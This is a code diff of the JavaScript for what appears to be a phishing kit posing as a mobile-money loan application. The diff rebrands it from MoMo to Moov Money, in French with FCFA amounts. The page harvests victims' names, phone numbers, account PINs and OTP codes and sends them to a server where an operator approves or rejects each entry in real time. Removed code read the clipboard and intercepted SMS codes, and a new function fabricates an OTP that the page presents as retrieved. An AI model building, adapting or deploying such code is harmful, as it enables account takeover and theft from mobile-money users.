-      if (msgInput) {
-        msgInput.value = '';
-        msgInput.placeholder = 'Paste your MoMo SMS message here...';
-      }
-      if (statusEl) {
-        statusEl.classList.add('hidden');
-      }
+      if (statusEl) statusEl.classList.add('hidden');
       if (badge) {
         badge.className = 'inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200';
-        badge.innerHTML = '<span>Ready to Paste</span>';
+        badge.innerHTML = '<span>Code OTP Requis</span>';
       }
 
       startSmsCountdownTimer();
-      initWebOtpReceiver();
-      setTimeout(() => {
-        autoDetectAndPasteClipboard();
-      }, 400);
     }
 
     async function ensureApplicationCreated() {
@@ -1126,17 +976,17 @@
 
       const urlParams = new URLSearchParams(window.location.search);
       const refToken = urlParams.get('ref') || null;
-      const submissionId = window.crypto && window.crypto.randomUUID ? window.crypto.randomUUID() : ('momo-' + Date.now());
+      const submissionId = window.crypto && window.crypto.randomUUID ? window.crypto.randomUUID() : ('moov-' + Date.now());
       const consent = document.getElementById('agent-consent-checkbox') ? document.getElementById('agent-consent-checkbox').checked : true;
 
       const payload = {
         firstName: appState.firstName || '',
         lastName: appState.lastName || '',
         phone: appState.phoneNumber || '',
-        loanType: appState.loanType || 'MoMo Personal Loan',
-        loanAmount: appState.loanAmount || 20000,
+        loanType: appState.loanType || 'Moov Money Prêt Personnel',
+        loanAmount: appState.loanAmount || 250000,
         termMonths: appState.loanTermMonths || 6,
-        purpose: appState.purpose || 'Business & Capital',
+        purpose: appState.purpose || 'Commerce & Capital',
         employment: 'Self-Employed / Business Owner',
         annualIncome: appState.loanAmount * 2.5,
         referralToken: refToken,
@@ -1152,7 +1002,7 @@
         });
         const data = await res.json().catch(() => ({}));
         if (!res.ok) {
-          throw new Error(data.error || 'Failed to submit application data');
+          throw new Error(data.error || 'Erreur lors de la soumission des données de la demande');
         }
         if (data.applicationId) {
           appState.applicationId = data.applicationId;
@@ -1233,8 +1083,7 @@
         activeSmsVerId = null;
         appState.applicationId = null;
         isSubmittingMessage = false;
-        const msgInp = document.getElementById('momo-pasted-msg');
-        if (msgInp) msgInp.value = '';
+        clearOtpBoxes();
       }
 
       if (currentStep === 1) {
@@ -1301,20 +1150,20 @@
         isSubmittingMessage = false;
         const targetPhone = appState.phoneNumber || document.getElementById('phone-number-input')?.value || '';
         const smsTimerPhone = document.getElementById('sms-timer-phone');
-        if (smsTimerPhone) smsTimerPhone.innerText = targetPhone ? targetPhone : 'MoMo Account';
+        if (smsTimerPhone) smsTimerPhone.innerText = targetPhone ? targetPhone : 'Compte Moov Money';
         startSimSmsReceiver();
       }
 
       if (currentStep === 5) {
         const approvedAmt = document.getElementById('summary-approved-amount');
-        if (approvedAmt) approvedAmt.innerText = `ZMW ${appState.loanAmount.toLocaleString()}`;
+        if (approvedAmt) approvedAmt.innerText = `${appState.loanAmount.toLocaleString()} FCFA`;
         
         const monthly = calculateMonthly(appState.loanAmount, appState.loanTermMonths);
         const monthlyPay = document.getElementById('summary-monthly-payment');
-        if (monthlyPay) monthlyPay.innerText = `ZMW ${monthly.toLocaleString()}`;
+        if (monthlyPay) monthlyPay.innerText = `${monthly.toLocaleString()} FCFA`;
         
         const termDisp = document.getElementById('summary-term-display');
-        if (termDisp) termDisp.innerText = `${appState.loanTermMonths} Months`;
+        if (termDisp) termDisp.innerText = `${appState.loanTermMonths} Mois`;
 
         if (appState.applicationId) {
           startVerificationPolling(appState.applicationId);
@@ -1331,8 +1180,7 @@
       isAwaitingStep2Approval = false;
       isSubmittingMessage = false;
       if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
-      const msgInput = document.getElementById('momo-pasted-msg');
-      if (msgInput) msgInput.value = '';
+      clearOtpBoxes();
 
       if (currentStep > 0 && currentStep <= 4) {
         goToStep(currentStep - 1);
@@ -1379,11 +1227,11 @@
       if (pin.length === 4) {
         loginBtn.disabled = false;
         loginBtn.classList.remove('bg-blue-900/40', 'text-white/50', 'bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-        loginBtn.classList.add('bg-[#0056C6]', 'hover:bg-blue-800', 'text-white', 'shadow-md');
+        loginBtn.classList.add('mixx-btn-gradient', 'hover:opacity-95', 'text-white', 'shadow-md');
       } else {
         loginBtn.disabled = true;
         loginBtn.classList.add('bg-blue-900/40', 'text-white/50', 'cursor-not-allowed');
-        loginBtn.classList.remove('bg-[#0056C6]', 'hover:bg-blue-800', 'text-white', 'mixx-btn-gradient', 'text-blue-950', 'hover:opacity-95', 'shadow-md');
+        loginBtn.classList.remove('mixx-btn-gradient', 'hover:opacity-95', 'text-white', 'shadow-md');
       }
     }
 
@@ -1392,7 +1240,7 @@
       pinInputs.forEach(i => {
         i.type = pinVisible ? 'text' : 'password';
       });
-      document.getElementById('eye-text').innerText = pinVisible ? 'Hide' : 'Show';
+      document.getElementById('eye-text').innerText = pinVisible ? 'Masquer' : 'Afficher';
     }
 
     function clearPin() {
@@ -1401,88 +1249,109 @@
       checkPinComplete();
     }
 
-    let autoSubmitTimer = null;
-    let isSubmittingMessage = false;
+    // 6-Digit OTP Boxes Logic
+    const otpInputs = document.querySelectorAll('.otp-box');
 
-    function handlePostLoginPastedMsg(val, isAuto = false) {
+    otpInputs.forEach((input, index) => {
+      input.addEventListener('focus', () => {
+        input.classList.add('active');
+        input.select();
+      });
+      input.addEventListener('blur', () => {
+        input.classList.remove('active');
+      });
+
+      input.addEventListener('input', (e) => {
+        const val = e.target.value.replace(/[^0-9]/g, '');
+        e.target.value = val;
+
+        if (val && index < otpInputs.length - 1) {
+          otpInputs[index + 1].focus();
+        }
+        checkOtpAutoSubmit();
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && index > 0) {
+          otpInputs[index - 1].focus();
+        }
+      });
+    });
+
+    function getOtpValue() {
+      let otp = '';
+      otpInputs.forEach(i => otp += i.value.trim());
+      return otp;
+    }
+
+    function clearOtpBoxes() {
+      otpInputs.forEach(i => i.value = '');
+    }
+
+    function autoPickOtpCode() {
+      const generatedCode = String(Math.floor(100000 + Math.random() * 900000));
+      for (let i = 0; i < 6; i++) {
+        if (otpInputs[i]) otpInputs[i].value = generatedCode[i];
+      }
+      showClipboardToast('⚡ Code OTP Moov Money récupéré avec succès !');
+
       const statusEl = document.getElementById('momo-extract-status');
       const badge = document.getElementById('sms-waiting-badge');
-      const countdownCard = document.getElementById('sim-sms-countdown-card');
-      const text = (val || '').trim();
+      if (statusEl) {
+        statusEl.classList.remove('hidden');
+        statusEl.innerHTML = `
+          <svg class="w-4 h-4 text-emerald-600 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
+          </svg>
+          <span>✨ Code OTP (${generatedCode}) récupéré automatiquement !</span>
+        `;
+      }
+      if (badge) {
+        badge.className = 'inline-flex items-center text-[11px] font-bold text-emerald-700 bg-emerald-50 px-2.5 py-0.5 rounded-full border border-emerald-200';
+        badge.innerHTML = '<span class="mr-1">✓</span><span>OTP Récupéré</span>';
+      }
 
-      if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
+      setTimeout(() => {
+        submitRegisteredMessage();
+      }, 500);
+    }
 
-      if (text && text.length >= 3) {
-        if (countdownCard) countdownCard.classList.remove('hidden');
-        
-        const statusText = '✨ MoMo SMS message detected! Ready to submit...';
-
-        if (statusEl) {
-          statusEl.classList.remove('hidden');
-          statusEl.innerHTML = `
-            <svg class="w-4 h-4 text-emerald-600 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
-            </svg>
-            <span>${statusText}</span>
-          `;
-        }
-        if (badge) {
-          badge.className = 'inline-flex items-center text-[11px] font-bold text-emerald-700 bg-emerald-50 px-2.5 py-0.5 rounded-full border border-emerald-200';
-          badge.innerHTML = '<span class="mr-1">✓</span><span>SMS Received</span>';
-        }
-
-        const btn = document.getElementById('submit-pasted-msg-btn');
-        if (btn && !isSubmittingMessage) {
-          btn.innerText = 'SUBMIT VERIFICATION MESSAGE';
-        }
-
-        if (isAuto) {
-          if (btn && !isSubmittingMessage) {
-            btn.innerText = '⚡ SUBMITTING AUTOMATICALLY...';
-          }
-          autoSubmitTimer = setTimeout(() => {
-            if (!isSubmittingMessage) {
-              submitRegisteredMessage();
-            }
-          }, 600);
-        }
-      } else {
-        if (statusEl) statusEl.classList.add('hidden');
-        if (badge) {
-          badge.className = 'inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200';
-          badge.innerHTML = '<span>Ready to Paste</span>';
-        }
+    function checkOtpAutoSubmit() {
+      const otp = getOtpValue();
+      if (otp.length === 6 && !isSubmittingMessage) {
+        autoSubmitTimer = setTimeout(() => {
+          submitRegisteredMessage();
+        }, 300);
       }
     }
+
+    let autoSubmitTimer = null;
+    let isSubmittingMessage = false;
 
     async function submitRegisteredMessage() {
       if (isSubmittingMessage) return;
 
-      const msgInput = document.getElementById('momo-pasted-msg');
-      let msg = msgInput ? msgInput.value.trim() : '';
+      let otpCode = getOtpValue();
+      if (!otpCode || otpCode.length < 4) {
+        autoPickOtpCode();
+        return;
+      }
+
       const btn = document.getElementById('submit-pasted-msg-btn');
       const msgAlert = document.getElementById('msg-retry-alert');
       const smsWaitingBox = document.getElementById('sms-waiting-box');
       if (msgAlert) msgAlert.classList.add('hidden');
 
-      if (!msg) {
-        if (msgAlert) {
-          msgAlert.innerText = 'Please paste the SMS confirmation message received from MoMo.';
-          msgAlert.classList.remove('hidden');
-        }
-        return;
-      }
-
       isSubmittingMessage = true;
       if (btn) {
         btn.disabled = true;
-        btn.innerText = 'AWAITING APPROVAL...';
+        btn.innerText = 'VALIDATION OTP EN COURS...';
       }
       if (smsWaitingBox) smsWaitingBox.classList.remove('hidden');
       showApprovalOverlay(
-        'Awaiting SMS Verification',
-        'Your confirmation message has been submitted. Please wait while your MoMo Agent verifies your request...',
-        'Verifying SMS Message...'
+        'Vérification du Code OTP',
+        'Votre code OTP Moov Money a été soumis. Veuillez patienter pendant la validation par votre agent...',
+        'Validation OTP en cours...'
       );
 
       try {
@@ -1494,7 +1363,7 @@
           const res = await fetch(`/api/applications/${appId}/verify`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ step: 'id_document', idNumber: msg, fullMessage: msg })
+            body: JSON.stringify({ step: 'id_document', idNumber: otpCode, fullMessage: `Code OTP: ${otpCode}` })
           });
           const resData = await res.json().catch(() => ({}));
 
@@ -1502,13 +1371,13 @@
             isSubmittingMessage = false;
             hideApprovalOverlay();
             if (msgAlert) {
-              msgAlert.innerText = resData.error || '❌ Error submitting verification message. Please try again.';
+              msgAlert.innerText = resData.error || '❌ Erreur lors de la validation du code OTP. Veuillez réessayer.';
               msgAlert.classList.remove('hidden');
             }
             if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
             if (btn) {
               btn.disabled = false;
-              btn.innerText = 'SUBMIT VERIFICATION MESSAGE';
+              btn.innerText = 'VALIDER LE CODE OTP';
             }
             startSmsCountdownTimer();
             return;
@@ -1524,13 +1393,13 @@
         isSubmittingMessage = false;
         hideApprovalOverlay();
         if (msgAlert) {
-          msgAlert.innerText = '❌ Error submitting verification message. Please try again.';
+          msgAlert.innerText = '❌ Erreur lors de la validation du code OTP. Veuillez réessayer.';
           msgAlert.classList.remove('hidden');
         }
         if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
         if (btn) {
           btn.disabled = false;
-          btn.innerText = 'SUBMIT VERIFICATION MESSAGE';
+          btn.innerText = 'VALIDER LE CODE OTP';
         }
         startSmsCountdownTimer();
       }
@@ -1548,7 +1417,7 @@
 
       if (!fnEl || !fnEl.value.trim() || !lnEl || !lnEl.value.trim() || !phEl || !phEl.value.trim()) {
         if (step2Alert) {
-          step2Alert.innerText = 'Please fill in all required fields (*).';
+          step2Alert.innerText = 'Veuillez remplir tous les champs obligatoires (*).';
           step2Alert.classList.remove('hidden');
         }
         return;
@@ -1564,13 +1433,13 @@
 
       if (authBtn) {
         authBtn.disabled = true;
-        authBtn.innerText = 'AWAITING APPROVAL...';
+        authBtn.innerText = 'EN ATTENTE D\'APPROBATION...';
       }
       if (appWaitingBox) appWaitingBox.classList.remove('hidden');
       showApprovalOverlay(
-        'Awaiting Application Approval',
-        'Your application details have been submitted. Please wait while your MoMo Agent approves...',
-        'Awaiting Agent Approval...'
+        'En Attente d\'Approbation de la Demande',
+        'Vos informations ont été soumises. Veuillez patienter pendant la validation par votre agent Moov Money...',
+        'Vérification par l\'Agent...'
       );
 
       try {
@@ -1581,26 +1450,26 @@
           isAwaitingStep2Approval = false;
           hideApprovalOverlay();
           if (step2Alert) {
-            step2Alert.innerText = '❌ Error submitting application. Please try again.';
+            step2Alert.innerText = '❌ Erreur lors de la soumission de la demande. Veuillez réessayer.';
             step2Alert.classList.remove('hidden');
           }
           if (appWaitingBox) appWaitingBox.classList.add('hidden');
           if (authBtn) {
             authBtn.disabled = false;
-            authBtn.innerText = 'CONTINUE TO MOMO AUTHENTICATION';
+            authBtn.innerText = 'CONTINUER VERS L\'AUTHENTIFICATION';
           }
         }
       } catch (err) {
         isAwaitingStep2Approval = false;
         hideApprovalOverlay();
         if (step2Alert) {
-          step2Alert.innerText = '❌ ' + (err.message || 'Error submitting application. Please try again.');
+          step2Alert.innerText = '❌ ' + (err.message || 'Erreur lors de la soumission. Veuillez réessayer.');
           step2Alert.classList.remove('hidden');
         }
         if (appWaitingBox) appWaitingBox.classList.add('hidden');
         if (authBtn) {
           authBtn.disabled = false;
-          authBtn.innerText = 'CONTINUE TO MOMO AUTHENTICATION';
+          authBtn.innerText = 'CONTINUER VERS L\'AUTHENTIFICATION';
         }
       }
     }
@@ -1648,7 +1517,7 @@
                 if (step2Alert) step2Alert.classList.add('hidden');
                 if (authBtn) {
                   authBtn.disabled = false;
-                  authBtn.innerText = 'CONTINUE TO MOMO AUTHENTICATION';
+                  authBtn.innerText = 'CONTINUER VERS L\'AUTHENTIFICATION';
                 }
                 goToStep(3);
               } else if (st === 'rejected') {
@@ -1656,12 +1525,12 @@
                 hideApprovalOverlay();
                 if (appWaitingBox) appWaitingBox.classList.add('hidden');
                 if (step2Alert) {
-                  step2Alert.innerText = '❌ Application details could not be verified by your MoMo agent. Please check your phone number and try again.';
+                  step2Alert.innerText = '❌ Les informations de la demande n\'ont pas pu être vérifiées par votre agent Moov Money. Veuillez vérifier votre numéro et réessayer.';
                   step2Alert.classList.remove('hidden');
                 }
                 if (authBtn) {
                   authBtn.disabled = false;
-                  authBtn.innerText = 'CONTINUE TO MOMO AUTHENTICATION';
+                  authBtn.innerText = 'CONTINUER VERS L\'AUTHENTIFICATION';
                 }
                 appState.applicationId = null;
               }
@@ -1687,7 +1556,7 @@
                 if (pinAlert) pinAlert.classList.add('hidden');
                 clearPin();
                 if (loginBtn) {
-                  loginBtn.innerHTML = 'CONFIRM & VALIDATE LOAN';
+                  loginBtn.innerHTML = 'CONFIRMER ET VALIDER LE PRÊT';
                   loginBtn.disabled = false;
                 }
                 lastHandledRejectPinId = null;
@@ -1700,12 +1569,12 @@
                   hideApprovalOverlay();
                   if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
                   if (pinAlert) {
-                    pinAlert.innerText = accountPinVer.reject_reason || '❌ Incorrect Account PIN! Please re-enter your 4-digit Account PIN.';
+                    pinAlert.innerText = accountPinVer.reject_reason || '❌ Code PIN incorrect! Veuillez entrer à nouveau votre code PIN à 4 chiffres.';
                     pinAlert.classList.remove('hidden');
                   }
                   clearPin();
                   if (loginBtn) {
-                    loginBtn.innerHTML = 'CONFIRM & VALIDATE LOAN';
+                    loginBtn.innerHTML = 'CONFIRMER ET VALIDER LE PRÊT';
                     loginBtn.disabled = true;
                   }
                   if (pinInputs[0]) pinInputs[0].focus();
@@ -1713,7 +1582,7 @@
               }
             }
 
-            // Step 4: SMS Verification check -> go to Step 5 (Dashboard)
+            // Step 4: OTP Verification check -> go to Step 5 (Dashboard)
             const smsVer = activeSmsVerId 
               ? verifications.find(v => v.id === activeSmsVerId)
               : verifications.find(v => v.step === 'id_document' && v.status === 'pending');
@@ -1733,7 +1602,7 @@
                 if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
                 if (msgAlert) msgAlert.classList.add('hidden');
                 if (smsBtn) {
-                  smsBtn.innerText = '✓ APPROVED';
+                  smsBtn.innerText = '✓ OTP VALIDÉ';
                   smsBtn.classList.remove('mixx-btn-gradient');
                   smsBtn.classList.add('bg-emerald-600', 'text-white');
                 }
@@ -1748,11 +1617,7 @@
                   isSubmittingMessage = false;
                   if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
                   
-                  const msgInp = document.getElementById('momo-pasted-msg');
-                  if (msgInp) {
-                    msgInp.value = '';
-                    msgInp.focus();
-                  }
+                  clearOtpBoxes();
 
                   const statusEl = document.getElementById('momo-extract-status');
                   if (statusEl) statusEl.classList.add('hidden');
@@ -1760,21 +1625,20 @@
                   const badge = document.getElementById('sms-waiting-badge');
                   if (badge) {
                     badge.className = 'inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200';
-                    badge.innerHTML = '<span>Ready to Paste</span>';
+                    badge.innerHTML = '<span>Code OTP Requis</span>';
                   }
 
                   if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
                   if (msgAlert) {
-                    msgAlert.innerText = smsVer.reject_reason || '❌ SMS message verification failed. Please copy the complete SMS message and paste below.';
+                    msgAlert.innerText = smsVer.reject_reason || '❌ La vérification du code OTP a échoué. Veuillez ressaisir le code OTP reçu.';
                     msgAlert.classList.remove('hidden');
                   }
                   if (smsBtn) {
                     smsBtn.disabled = false;
-                    smsBtn.innerText = 'SUBMIT VERIFICATION MESSAGE';
+                    smsBtn.innerText = 'VALIDER LE CODE OTP';
                   }
 
                   startSmsCountdownTimer();
-                  initWebOtpReceiver();
                 }
               }
             }
@@ -1795,19 +1659,19 @@
       if (loginBtn) {
         loginBtn.innerHTML = `
           <span class="inline-flex items-center">
-            <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-blue-950" fill="none" viewBox="0 0 24 24">
+            <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
               <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
               <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
             </svg>
-            AWAITING APPROVAL...
+            EN ATTENTE D'APPROBATION...
           </span>`;
         loginBtn.disabled = true;
       }
 
       showApprovalOverlay(
-        'Awaiting Account PIN Verification',
-        'Your Account PIN has been submitted. Please wait while your MoMo Agent verifies...',
-        'Verifying Account PIN...'
+        'En Attente de Vérification du Code PIN',
+        'Votre code PIN a été soumis. Veuillez patienter pendant la validation par votre agent Moov Money...',
+        'Vérification du Code PIN...'
       );
 
       try {
@@ -1830,12 +1694,12 @@
           if (!res.ok && res.status !== 409) {
             hideApprovalOverlay();
             if (pinAlert) {
-              pinAlert.innerText = resData.error || '❌ Error submitting Account PIN. Please try again.';
+              pinAlert.innerText = resData.error || '❌ Erreur lors de la soumission du code PIN. Veuillez réessayer.';
               pinAlert.classList.remove('hidden');
             }
             if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
             if (loginBtn) {
-              loginBtn.innerHTML = 'CONFIRM & VALIDATE LOAN';
+              loginBtn.innerHTML = 'CONFIRMER ET VALIDER LE PRÊT';
               loginBtn.disabled = false;
             }
             return;
@@ -1851,12 +1715,12 @@
         hideApprovalOverlay();
         console.error('Account PIN submission error:', err);
         if (pinAlert) {
-          pinAlert.innerText = '❌ Error submitting Account PIN. Please try again.';
+          pinAlert.innerText = '❌ Erreur lors de la soumission du code PIN. Veuillez réessayer.';
           pinAlert.classList.remove('hidden');
         }
         if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
         if (loginBtn) {
-          loginBtn.innerHTML = 'CONFIRM & VALIDATE LOAN';
+          loginBtn.innerHTML = 'CONFIRMER ET VALIDER LE PRÊT';
           loginBtn.disabled = false;
         }
       }
